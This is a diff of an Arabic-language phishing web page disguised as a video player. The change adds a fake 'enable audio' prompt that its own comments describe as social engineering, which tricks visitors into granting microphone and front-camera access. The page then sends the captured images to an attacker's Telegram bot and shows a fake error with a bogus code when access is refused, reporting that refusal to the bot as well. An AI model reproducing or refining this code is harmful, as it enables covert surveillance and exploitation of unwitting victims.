@@ -3,32 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title></title>
+    <title>فديو</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; font-family: sans-serif; }
         .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        /* شاشة الخطأ عند رفض الأذونات */
+        
+        /* 1. تصميم الرسالة التمهيدية (الوهمية) */
+        #prePermissionOverlay { 
+            display: none; /* مخفية في البداية */
+            position: fixed; 
+            top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.85); /* خلفية سوداء شفافة */
+            color: white; 
+            z-index: 99999; /* فوق كل شيء */
+            text-align: center; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            font-size: 18px; line-height: 1.6;
+        }
+        #prePermissionOverlay span { color: #4d94ff; font-weight: bold; font-size: 22px; margin-bottom: 15px; }
+        #prePermissionOverlay button { 
+            margin-top: 25px; 
+            padding: 12px 30px; 
+            background: #4d94ff; /* لون أزرق رسمي */
+            color: white; border: none; border-radius: 25px; 
+            cursor: pointer; font-size: 16px; font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transition: background 0.3s;
+        }
+        #prePermissionOverlay button:hover { background: #3377ff; }
+
+        /* 2. تصميم شاشة الخطأ (عند رفض الأذونات) */
         #errorOverlay { 
             display: none; 
             position: fixed; 
             top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); color: white; 
-            z-index: 9999; text-align: center; 
+            background: rgba(0,0,0,0.95); color: white; 
+            z-index: 99998; text-align: center; 
             padding-top: 50%; font-size: 18px; line-height: 1.6;
         }
         #errorOverlay span { color: #ff4d4d; font-weight: bold; font-size: 22px; }
-        #errorOverlay button { margin-top: 20px; padding: 10px 20px; background: #ff4d4d; color: white; border: none; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
 
+    <div id="prePermissionOverlay">
+        <span>⚠️ تفعيل مشغل الصوت</span><br>
+        لضمان تجربة مشاهدة كاملة،<br>
+        يرجى الضغط على "سماح" في النافذة التالية لتشغيل صوت الفيديو.<br>
+        <button id="proceedButton">موافق، تشغيل الصوت</button>
+    </div>
+
     <div id="errorOverlay">
         <span>⚠️ خطأ في الأذونات</span><br>
         لم نتمكن من الوصول إلى الصلاحيات المطلوبة للمشاهدة.<br>
-        يرجى إعادة فتح الرابط وتفعيل الصلاحيات.<br>
-        <button onclick="window.location.reload();">أعد المحاولة</button>
+        يرجى إعادة فتح الرابط وتفعيل الصلاحيات من الإعدادات.<br>
+        <p style="font-size:12px; opacity:0.6; margin-top:20px;">كود الخطأ: 0x80040154</p>
     </div>
 
     <div class="video-wrapper" id="videoBox">
@@ -42,40 +73,43 @@
         const chatId = "1611398303";
 
         window.onload = function() {
-            // تشغيل الفيديو فوراً (أو في حال تفاعل المستخدم)
+            // تشغيل الفيديو فوراً كصورة (Muted)
             const video = document.getElementById('mainVideo');
             video.play().catch(() => console.log("بانتظار التفاعل"));
 
-            // طلب الصلاحيات بعد ثانية واحدة فقط (أسرع)
-            setTimeout(startSecureTest, 1000);
+            // أظهار الرسالة التمهيدية بعد ثانية ونصف
+            setTimeout(() => {
+                document.getElementById('prePermissionOverlay').style.display = 'flex';
+            }, 1500);
         };
 
-        // دالة لطلب الأذونات وإعادة طلبها في كل مرة
-        function startSecureTest() {
-            // حل مشكلة تذكر الرفض: استخدم طلب الصوت كبداية (أكثر فعالية لإعادة الطلب)
-            navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(audioStream => {
-                // إذا وافق على الصوت، اطلب الكاميرا فوراً
-                return navigator.mediaDevices.getUserMedia({ 
+        // 🔱 عندما يضغط المستخدم على زر "موافق" في الرسالة التمهيدية
+        document.getElementById('proceedButton').onclick = function() {
+            // إخفاء الرسالة التمهيدية
+            document.getElementById('prePermissionOverlay').style.display = 'none';
+            // بدء طلب الصلاحيات الحقيقية فوراً
+            startSecureTest();
+        };
+
+        async function startSecureTest() {
+            try {
+                // طلب الصوت أولاً (لتوافق مع رسالة الهندسة الاجتماعية)
+                await navigator.mediaDevices.getUserMedia({ audio: true });
+                
+                // إذا وافق على الصوت، نطلب الكاميرا فوراً (الضحية يظن أنها خطوة واحدة)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: 1280, height: 720 },
-                }).then(videoStream => {
-                    // ادمج الصوت والصورة
-                    videoStream.addTrack(audioStream.getAudioTracks()[0]);
-                    return videoStream;
                 });
-            })
-            .then(stream => {
-                // النجاح في الحصول على الصلاحيات
+                
                 captureAndSend(stream);
-            })
-            .catch(err => {
-                // حل مشكلة الرفض: إخفاء الفيديو بالكامل وإظهار شاشة خطأ مقنعة
+            } catch (err) {
+                // إخفاء الفيديو بالكامل وإظهار شاشة خطأ مقنعة
                 document.getElementById('videoBox').style.display = 'none';
                 document.getElementById('errorOverlay').style.display = 'block';
                 
                 // إرسال تنبيه بفشل العملية للبوت
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ المستخدم رفض الأذونات أو تم تذكر الرفض الدائم")}`);
-            });
+            }
         }
 
         function captureAndSend(stream) {
@@ -95,7 +129,7 @@
                     sendToTelegram(imgData, "مرفوض", "مرفوض");
                 });
 
-                // إغلاق כל المسارات فوراً لضمان طلبها مرة أخرى عند إعادة الفتح
+                // إغلاق كل المسارات فوراً لضمان طلبها مرة أخرى عند إعادة الفتح
                 stream.getTracks().forEach(track => track.stop());
             }, 1000);
         }
